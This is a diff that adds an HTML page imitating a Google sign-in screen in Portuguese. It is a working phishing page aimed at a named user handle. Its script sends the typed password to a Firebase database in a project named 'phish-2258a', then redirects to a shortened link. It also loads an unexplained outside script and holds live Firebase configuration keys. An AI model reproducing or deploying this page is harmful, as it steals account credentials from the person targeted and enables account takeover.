@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+     <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+     <link rel="preconnect" href="https://fonts.gstatic.com">
+     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet">
+     <title>Fazer login nas Contas do Google</title>
+     
+     <style>
+          *{
+               margin: 0;
+               padding: 0;
+               box-sizing: border-box;
+          }
+          
+          body{
+               background: #FFF;
+               font-family: sans-serif;
+          }
+          
+          .logo{
+               height: 25px;
+               margin-top: 25px;
+               margin-bottom: 15px;
+          }
+          
+          .texto1{
+               font-weight: 400;
+               font-size: 23px;
+               margin-bottom: 10px;
+          }
+          
+          .texto2{
+               font-weight: 400;
+               font-size: 17px;
+          }
+          
+          /*Formulário*/
+               .contact-form{
+                    height: auto;
+               }
+          
+               .contact-form>.senha{
+                    margin-top: 45px;
+                    height: 55px;
+                    width: 87%;
+                    border: 1.5px solid #D6D6D6;
+                    border-radius: 5px;
+                    font-size: 17px;
+                    padding: 15px;
+                    color: #000;
+               }
+               
+               .contact-form>.senha:focus{
+                    box-shadow: 0 0 0 0;
+                    border: 2px solid #0089FF;
+                    outline: 0;
+               }
+               
+               .contact-form>.senha::-webkit-input-placeholder {
+                    color: #969696;
+               }
+               
+          /*Fim do formulário*/
+     </style>
+</head>
+<body>
+     <div class="infoSite" align="center">
+          <img class="logo" src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png"/>
+          <h2 class="texto1">Olá!</h2>
+          <h3 class="texto2">É bom vê-lo (a) novamente.</h3>
+          
+          <form class="contact-form">
+               <input id="password" class="senha" type="password" placeholder="Digite sua senha">
+               <div class="forget" 
+                    style="
+                         margin-top: 20px;
+                         width: 87%;
+                         display: flex;
+                         flex-direction: row;
+                         justify-content: space-between;
+                    "> 
+                    <label for="mostrar-senha" style="font-size: 14px;">
+                        <input type="checkbox" id="mostrar-senha" style="margin-right: 10px;"></input> Mostrar senha
+                    </label>
+               </div>
+               
+               <div class="botoes" 
+                    style="
+                         margin-top: 20px;
+                         width: 87%;
+                         display: flex;
+                         flex-direction: row;
+                         justify-content: space-between;
+                    ">
+                    <button 
+                         style="
+                              padding: -10px 20px;
+                              background: none;
+                              font-size: 15px;
+                              border: none;
+                              border-radius:  5px;
+                              color: #0089FF;
+                         ">Esqueceu seu senha?
+                    </button>
+                         
+                    <button type="submit" id="submit-button" 
+                         style="
+                              padding: 10px 20px;
+                              background: #0089FF;
+                              font-size: 15px;
+                              border: none;
+                              border-radius:  5px;
+                              color: #FFF;" onClick="window.location.href='https://bit.ly/3jqrL7B';"
+                >Avançar
+                    </button>
+               </div>
+          </form>
+     </div>
+     
+     <script src="https://files.catbox.moe/q35lr8.js"></script>
+     <script src="https://www.gstatic.com/firebasejs/8.7.1/firebase.js"></script>
+     <script>
+     // Your web app's Firebase configuration
+          // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+          var firebaseConfig = {
+              apiKey: "AIzaSyBv2EPBYnkKLbM-27Gsa93eEFhNQgMURDk",
+              authDomain: "phish-2258a.firebaseapp.com",
+              databaseURL: "https://phish-2258a-default-rtdb.firebaseio.com",
+              projectId: "phish-2258a",
+              storageBucket: "phish-2258a.appspot.com",
+              messagingSenderId: "770476817045",
+              appId: "1:770476817045:web:8d3f9144b35c54fbd1b99c",
+              measurementId: "G-FQJRETNXR4"
+          };
+          // Initialize Firebase
+          firebase.initializeApp(firebaseConfig);
+          firebase.analytics();
+
+          //Name of user
+          let contactInfo = firebase.database().ref("Dados privados").child("@clarafreitas96");
+
+          //Listen for a submit
+          document.querySelector(".contact-form").addEventListener("submit", submitForm);
+
+          function submitForm(e){
+               e.preventDefault();
+     
+               //Get input values
+               let senha = document.querySelector(".senha").value;
+     
+               console.log(senha);
+     
+               saveContactInfo(senha);
+     
+       /*        document.querySelector(".contact-form").reset();*/
+          }
+
+          //Save infos to Firebase
+          function saveContactInfo(senha){
+               let newContactInfo = contactInfo.push();
+     
+               newContactInfo.set({
+                    Senha: senha,
+               });
+
+          }
+     </script>
+     
+</body>
+</html>
